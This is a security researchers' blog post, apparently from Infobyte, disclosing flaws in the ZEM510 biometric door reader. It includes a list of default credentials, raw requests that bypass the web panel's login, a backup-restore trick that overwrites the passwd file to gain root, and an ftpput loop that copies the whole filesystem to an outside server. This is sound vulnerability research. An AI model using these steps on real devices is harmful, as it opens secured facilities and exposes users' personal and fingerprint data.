as you may have noticed from other blog posts we like to play around with basically any device we can get our hands on incidentally this year we acquired a biometric device that we have had the chance to see during some audits we carried out front view of the zem510 fingerprint reader normally when a bug is found in embedded devices they provide access to a network which could be used to pivot or persist in a network in this case they can provide physical access to a facility its normal to see this kind of fingerprint readers providing access control to highly secure areas such as data centers or entire buildings back view of the zem510 fingerprint reader on plain sight we can finda bootloader screen that says  linux  security for your life lcd screendigital fingerprint readera keypadpower supply port rj45 network port2 usb portsat the back there is a little tamper switch that will detect when the device is detached from the wall and will trigger the alarm mode overview the specific name of the device is zki01a id gprs also known as zem510 and costs approximately u200 its made by zksoftware which happens to have a reseller here in argentina its a biometric fingerprint reader thats supposed to provide controlled entrance of personnel and security to facilities in their official websites you can find a detailed documentation about it downloads and user manual also available between the principal characteristics there are a few to highlight communication methods rs232485usb hostclient tcpipwiegand reader em marin125 khz protocol wiegand 26power supply 12v 15a and a 4hs additional battery programmable output for a bell looking for a way to communicateserial connection via usbwe tried serial communication via usb which creates a virtual serial port using miniterm and screen synchronizing the recommended baud rates and rebooting the device in order to expect some kind of prompt or output but nothing came out of it  ethernet connection via utp cable after noticing that the network interface by default sets its ip address to 1921681201 and has an access restriction by ip we found out that setting our local one to 1921681220 would do the trick once we have connection an nmap port scan shows this results tcp 80  the device is running webserver tcp 23  a classic telnet server telnetd from busyboxtcpudp 4370  custom protocol udp 65535  custom protocol that will respond to requests to broadcast and is used to find the fingerprint readers in the network interesting ports lets dig up a little more telnet zem510 port 23 seems to be a telnet service we check if its legitimatetelnetting device trying luck with telnet using default users such asadminadmin rootroot admin1234doing a bit of research on the internet we managed to gather several default userpasswords that this vendor normally uses for this kind of devicesrootcolorkey rootsolokey rootswsbzkgn adminadmin 888manage manage888 manage888 asptest 888asp unfortunately not a single one of them worked on our device additional tools like hydra and medusa were used but also where a nogo web application panel port 80 was showing a web server so we decided to check it out a website and a login page for what seems to be a control panel appeared web panel login using a classic administrator123456 we got access to the web panel default user credentials working browsing the website and logging the requests led us to determine the web server and the application was handling sessions in a very poor way we could access pages that needed authorization without being authenticated the file startcsl includes menucsl and this last one gives you access to the rest so we should try to access it first we need to destroy our cookie and make sure we are using an empty one to access a restricted area showing session cookie on console showing empty cookie on console on startcsl and were in lets see the requests in plaintext with ncat so you understand the gravity of the situation accessing cslstartisr ncat zkwebserver 80 get cslstart http11 host zkwebserver http10 200 ok server zk web server pragma nocache cachecontrol nocache contenttype texthtml connection close htmlheadtitletitle meta httpequivcontenttype contenttexthtml meta httpequivcachecontrol contentnocache meta httpequivpragma contentnocache link hrefcsssecutimecss typetextcss relstylesheet meta contentmshtml 60029003562 namegeneratorhead frameset border0 frame spacing0 rows37 frame borderno cols frame nameheader srccslheader no resize scrollingno frameset border0 frame spacing0 rows frame borderno cols180 frame namemenu srccslmenu no resize scrollingauto frame namecontent srccsldesktopframeset frameset htmlyou can see that the web server replied with 200 ok and tried to load in framesets cslmenu csldesktop and cslheader without asking for an auth so far we cant state for sure that calling cslmenu directly will have the same effect accessing cslmenu stripped content for clarityisr ncat zkwebserver 80 get cslmenu http11 host zkwebserver http10 200 ok server zk web server pragma nocache cachecontrol nocache contenttype texthtml connection close terminal javascriptoncwx   login off csldesktop  dev status user report cslreport  report cslquery  query formreal time  monitor user administration csldpm  department csluser  user csluseractionadd  add user setting formdeviceact5  tcpip formdeviceact17  wifi setting formdeviceact3  datetime formdeviceact7  change password terminal formdeviceact11  backup formdeviceact14  restore formdeviceact12  update csldownload  download formdevice  reboot response shows menu content loaded completely and to make it even better you can see how bad they are handling sessions the login off option is nothing more than a call to a java script function that takes you to the login page if the login page had a destroy session or something alike it would be considered a csrf which in this case supposing that sessions were handled properly meant the only security administrators had but no not even that we can conclude either an anonymous user or an administrator have the same privileges on the website making session handling utterly useless the only difference would be that the anon user has to access menu directly and the admin can make use of their fantastic web 30 login web vulnerabilities now that we completely control the web interface we started looking for vulnerabilities that could lead to access to the linux thats running below for this post were leaving web vulnerabilities aside and instead well discuss just one major one youll see why soon web backup section in the backup section we got two options backup either system data or user data any of those options will download a dat file downloading backup system data example showing downloaded filesisrzk file  datadat gzip compressed data max compression from unix devicedat gzip compressed data max compression from unix they are both gzipped lets extract them userdat backup user data isrzk tar zxf datadat  ls r   datadat devicedat mnt mnt mtdblock mntmtdblock custattstatedat custvoicedat data dpmidxdat extlogdat extuserdat oplogdat smsdat udatadat userdat workcodedat mntmtdblockdata extlogdat templatedat transactiondat peeking around we found that most of the files were illegible or empty and decided to continue with the next gzipped file before going further we deleted the entire extracted folder in order to avoid contents to be overwritten in the next extraction devicedat backup system data isrzk tar zxf devicedat  ls r   datadat devicedat mnt mnt mtdblock mntmtdblock optionscfg a config file is always interesting to see the file optionscfg contains configuration variables below some of them categorized for a better understanding network ipaddress1921681201 gateipaddress19216811 net mask2552552550 communication udpport4370 tcpport4368 webport80 rs232baud rate115200 rs232on1 device info platform oemvendorzksoftware inc alg verzkfinger product time serial number device name device configuration tftkey layout0 lcd mode0 key pad beep1 voice on1 volume67 alarm op log99 language83 adm retry3 web administrator password login pwd123456 paths wavfilepathmntramdiskwav bmpfilepathmntmtdblockimage fontfilepathmntmtdblock picfilepathmntmtdblock web rootmntmtdblock photofilepathmntmtdblockphoto capturephotopathmntmtdblockits clear that optionscfg includes lots of sensible configuration information not only from the web interface but from the entire device that you can even pushed back modified with the restore backup option unauthenticated soap apiif you want to head this way you will also find that the web server has a soap api without authentication of course allowing you to retrieve the entire list users passwords included the last users that opened the door and pretty much everything got root arbitrary file injection at this stage it was clear for us that we should try to reupload the backup folder with additional files to test the restrictions of the uploader and see what happens as we already know the server thats running behind is a linux on a mips meaning users passwords database is etcpasswd file and probably etcshadow so we generate a passwd file with user root and a known passwordisrzk echo rootknownpassword00rootrootbinsh  passwd note that were using the plain representation as an example md5crypt should be used setting up the passwd file in contextisrzk mkdir etc  mv passwd etccompressing again with gzip and uploading our backup via web interface using the same name the file had when it was downloaded datadat for example restore data section upload success lets see if it worked shall we zem510 shell prompt awesome as you can see the passwd file was successfully overwritten with ours and now we have root access privacy issues all these vulnerabilities also raise the question of privacy are the personal information of the users safe from the users manual the manufacturer claims the following all of our fingerprint recognition devices for civil use only collect the characteristic points of fingerprints instead of the fingerprint images and therefore no privacy issues are involved zksoftware statement on collection of fingerprints ok that would be great if it were completely true login ids as weve seen in pentests before are always associated with the users real name and their fingerprint the vendor states that the fingerprint is stored as a representation of itself and they are not lying but also missing an important point on the process when a fingerprint is scanned and pushed back to the database interchangeably if it comes from a new user or an existing one a temporary fingerprint image is always stored at mntramdiskfingerbmp so the device can calculate its characteristics until the next fingerprint replaces it an example of a typical image that can be found on the device thumb fingerprint compromising the device and installing a backdoor to retrieve every uploaded fingerprint to later associate them to the corresponded users will end up on a nice recompilation of information from a facility dont you think emulation of the device in order to find more vulnerabilities we will set up the embedded device but since there is no firmware available we are going to extract all the information from a live device dump it allto understand more about the structure of the os we downloaded it entirely busybox command list the commands were scarce but making a simple script like the one below using ftpput we were able to pull the entire system to our computersdumpsh for i in  find pwd name  do ftpput ftpserver i i done having everything needed to replicate the environment we just miss a mips virtual machine to properly emulate the firmware and this can be achieved quite easily by using qemu with the vm working and with a chroot in place we were able to run a binary named « main » located in mntmtdblockmain which is in fact the main binary for the web application and almost everything its also one of the few binaries that run in the server besides telnetd troubleshooting when launching main we found out it was messing with the tty that is used as a framebuffer device for the tft screen making it impossible to interact same thing happened with network it reconfigures when starting but by adding an empty « ifconfig » command in usrlocalbin we were able to circumvent this problem additional findings we also found that the web service and their custom « main » service were vulnerable of buffer overflows and arbitrary file disclosure these vulnerabilities will be published on part ii next week thanks to achillean who kindly provided us access to shodan maps we leave you this lovely postcard authors from infobytesec team federico kirschbaum  fedekmatías a ré medina  mattaerealkorantin auguste  palkeojuan urbano  juanurssshare  tweet ✚related post infobyte is coming to rsa conference 2015 ready for japan  avtokyo 2017faraday arsenal bhasia 2017 review a tale of a dns packet cve20162776hunting the hunter finding bugs in nsa tools check out faraday v1018 